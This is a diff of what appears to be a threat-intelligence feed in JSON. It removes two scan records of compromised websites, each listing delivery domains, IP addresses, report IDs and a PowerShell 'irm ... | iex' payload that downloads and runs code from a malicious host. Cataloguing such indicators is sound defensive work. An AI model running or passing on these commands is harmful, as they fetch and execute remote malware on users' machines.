@@ -21288,46 +21288,5 @@
     ],
     "ReportId": "cmwaofa4901pv0oml2dv9jutk",
     "ScannedAt": "2026-11-10T12:38:50.099000+00:00"
-  },
-  {
-    "UrlDomain": "productosalimenticiosarucas.es",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "91.108.98.213"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&_v=29905231",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/e42e22c5e92d53e7'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/e42e22c5e92d53e7"
-    ],
-    "ReportId": "cmwao8o3p01la0omlmotcq335",
-    "ScannedAt": "2026-11-10T12:33:41.704000+00:00"
-  },
-  {
-    "UrlDomain": "eared.org",
-    "DeliveryUrl": [
-      "t-trustresnew.com"
-    ],
-    "PayloadUrl": [
-      "https://t-trustresnew.com/Girya/c2bb5e53eeac1f49"
-    ],
-    "IP": [
-      "179.43.116.166"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/c2bb5e53eeac1f49')|iex",
-    "ResolvedDownloadUrl": [
-      "https://t-trustresnew.com/Girya/c2bb5e53eeac1f49"
-    ],
-    "ReportId": "cmwanjbw9018m0omlq3184wsq",
-    "ScannedAt": "2026-11-10T12:13:59.457000+00:00"
   }
 ]
